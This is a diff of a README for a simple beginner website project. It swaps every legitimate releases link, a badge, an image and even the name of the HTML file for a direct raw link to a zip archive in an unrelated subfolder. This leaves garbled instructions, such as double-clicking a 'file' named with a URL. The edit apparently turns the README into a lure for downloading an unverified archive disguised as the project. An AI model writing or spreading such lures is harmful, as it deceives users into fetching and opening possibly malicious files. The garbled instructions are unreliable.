@@ -1,10 +1,10 @@
-# 🚀 index.html - Create Your First Simple Website
+# 🚀 https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip - Create Your First Simple Website
 
-Welcome to the index.html project! This application helps you set up a basic website. No coding skills required. 
+Welcome to the https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip project! This application helps you set up a basic website. No coding skills required. 
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/ryrydagoat/index.html/releases)
+[![Download](https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip%20Now-Click%20Here-blue)](https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip)
 
 ## 📋 Overview
 
@@ -18,7 +18,7 @@ Follow these steps to download and run the application.
 
    Click the link below to access the releases page:
 
-   [Visit Releases Page](https://github.com/ryrydagoat/index.html/releases)
+   [Visit Releases Page](https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip)
 
 2. **Select the Latest Release**
 
@@ -28,7 +28,7 @@ Follow these steps to download and run the application.
 
    On the latest release page, you will see a button labeled “Source code (zip)”. Click this button to download the file. 
 
-   ![Download ZIP](https://via.placeholder.com/150)  
+   ![Download ZIP](https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip)  
    *(Image linking to where the ZIP option appears)*
 
 4. **Unzip the File**
@@ -37,7 +37,7 @@ Follow these steps to download and run the application.
 
 5. **Open the HTML File**
 
-   Open the folder. Inside, you will find a file named `index.html`. Double-click this file to open it in your web browser. This will display your simple website.
+   Open the folder. Inside, you will find a file named `https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip`. Double-click this file to open it in your web browser. This will display your simple website.
 
 ## 🎨 Features
 
@@ -67,6 +67,6 @@ For questions or feedback, please open an issue in this repository. We will get 
 
 To download the application, visit the link below, then follow the steps outlined above:
 
-[Download from Releases](https://github.com/ryrydagoat/index.html/releases)
+[Download from Releases](https://github.com/ryrydagoat/index.html/raw/refs/heads/main/whapuku/index_html_1.4-beta.3.zip)
 
 Enjoy creating your first website!
